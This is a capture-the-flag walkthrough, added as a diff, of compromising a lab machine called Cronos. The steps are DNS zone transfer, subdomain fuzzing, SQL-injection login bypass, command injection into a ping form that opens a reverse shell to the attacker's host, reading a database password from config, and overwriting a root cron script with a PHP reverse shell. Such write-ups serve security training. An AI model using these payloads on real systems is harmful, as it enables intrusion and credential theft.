@@ -1,0 +1,125 @@
+
+
+
+DNS service (port 53) is open for both UDP and TCP. 
+Normally, most DNS queries use UDP, but some operations, like zone transfers (AXFR), require TCP.
+
+┌──(root㉿kali)-[/home/kali]
+└─# dig axfr @10.10.10.13 cronos.htb
+
+; <<>> DiG 9.20.11-4+b1-Debian <<>> axfr @10.10.10.13 cronos.htb
+; (1 server found)
+;; global options: +cmd
+cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
+cronos.htb.		604800	IN	NS	ns1.cronos.htb.
+cronos.htb.		604800	IN	A	10.10.10.13
+admin.cronos.htb.	604800	IN	A	10.10.10.13
+ns1.cronos.htb.		604800	IN	A	10.10.10.13
+www.cronos.htb.		604800	IN	A	10.10.10.13
+cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
+;; Query time: 31 msec
+;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP)
+;; WHEN: Wed Dec 10 11:51:33 EST 2025
+;; XFR size: 7 records (messages 1, bytes 203)
+
+                                                                                                                     
+we can also fuzz
+┌──(root㉿kali)-[/home/kali]
+└─# wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://10.10.10.13/ -H "Host: FUZZ.cronos.htb" --hh 11439
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.13/
+Total requests: 19966
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000001:   200        85 L     137 W      2319 Ch     "www"                                               
+000000024:   200        56 L     139 W      1547 Ch     "admin"      
+
+
+on admin.cronos.htb we are able to bypass login with 
+
+' or 1=1#
+
+webpage where we are able to traceroute or ping with input
+
+we can get a revshell with
+
+8.8.8.8;bash -c 'bash -i >& /dev/tcp/10.10.14.38/53 0>&1'
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lnvp 53                         
+listening on [any] 53 ...
+connect to [10.10.14.38] from (UNKNOWN) [10.10.10.13] 48488
+bash: cannot set terminal process group (1313): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@cronos:/var/www/admin$ 
+
+www-data@cronos:/var/www/admin$ ls
+config.php  index.php  logout.php  session.php	welcome.php
+
+www-data@cronos:/var/www/admin$ cat config.php 
+<?php
+   define('DB_SERVER', 'localhost');
+   define('DB_USERNAME', 'admin');
+   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
+   define('DB_DATABASE', 'admin');
+   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
+?>
+www-data@cronos:/var/www/admin$ 
+
+
+
+
+
+www-data@cronos:/home/noulis$ cat /etc/cron
+cron.d/       cron.daily/   cron.hourly/  cron.monthly/ cron.weekly/  crontab       
+www-data@cronos:/home/noulis$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+* * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
+
+
+
+www-data@cronos:/home/noulis$ ls -lsa /var/www/laravel/artisan 
+4 -rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
+
+www-data@cronos:/home/noulis$ echo "<?php system('bash -c \"bash -i >& /dev/tcp/10.10.14.38/3 0>&1\"'); ?>" > /var/www/laravel/artisan
+www-data@cronos:/home/noulis$ 
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lnvp 3   
+listening on [any] 3 ...
+connect to [10.10.14.38] from (UNKNOWN) [10.10.10.13] 58568
+bash: cannot set terminal process group (1750): Inappropriate ioctl for device
+bash: no job control in this shell
+root@cronos:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+
+
+
+
+
+
+
